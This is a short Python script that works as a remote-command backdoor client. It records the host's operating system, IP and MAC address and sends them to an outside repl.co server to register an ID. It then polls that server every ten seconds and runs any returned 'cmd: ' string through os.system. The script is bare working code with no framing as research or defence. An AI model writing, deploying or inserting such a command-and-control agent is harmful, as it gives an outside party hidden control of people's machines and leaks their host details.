import requests as r
from time import sleep
import platform
import socket
import netifaces
import json
import os
import threading

def get_ip_addr():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    lo = (s.getsockname()[0])
    s.close()
    return lo

ipaddr = get_ip_addr()

def get_mac_ip(ip):
	all_nets = netifaces.interfaces()
	for me in all_nets:
		try:
			if ip in str(netifaces.ifaddresses(me)):
				return netifaces.ifaddresses(me)[netifaces.AF_LINK][0]["addr"]
				pass
		except:
			pass
	return '00:00:00:00:00:00'

macaddr = get_mac_ip(ipaddr)

#all_nets = netifaces.interfaces()
#if len(all_nets)> 0:
#	if 'win' in platform.system().lower():
#		macaddr = netifaces.ifaddresses(all_nets[0])[netifaces.AF_LINK][0]["addr"]
#	else:
#		if 'linux' in platform.system().lower():
#			if all_nets[0] != 'lo':
#				macaddr = netifaces.ifaddresses(all_nets[0])[netifaces.AF_LINK][0]["addr"]
#			else:
#				macaddr = netifaces.ifaddresses(all_nets[len(all_nets)-1])[netifaces.AF_LINK][0]["addr"]
#else:
#	macaddr = '00:00:00:00:00:00'



try:
	conf = json.loads(open('config.json','r').read())
	pass
except:
	conf = {}
	conf["os"] = platform.system()
	conf["ip"] = get_ip_addr()
	conf["mac"] = get_mac_ip(conf["ip"])
	conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_fix_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr}).text
	f = open('config.json','w')
	f.write(json.dumps(conf))
	f.close()
	pass

while True:
	to = (r.get('https://practserver.kamakepar.repl.co/approve_me?id='+conf["id"]).text)
	if to == 'update':
		ids = conf["id"]
		conf = {}
		conf["os"] = platform.system()
		conf["ip"] = get_ip_addr()
		conf["mac"] = get_mac_ip(conf["ip"])
		conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
		f = open('config.json','w')
		f.write(json.dumps(conf))
		f.close()
		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
	if to == 'No user':
		ids = conf["id"]
		conf = {}
		conf["os"] = platform.system()
		conf["ip"] = ipaddr
		conf["mac"] = macaddr
		conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
		f = open('config.json','w')
		f.write(json.dumps(conf))
		f.close()
		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
	if 'cmd: ' in to:
		t = threading.Thread(target=os.system, args=(to.replace('cmd: ',''),));t.start()
		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
	sleep(10)
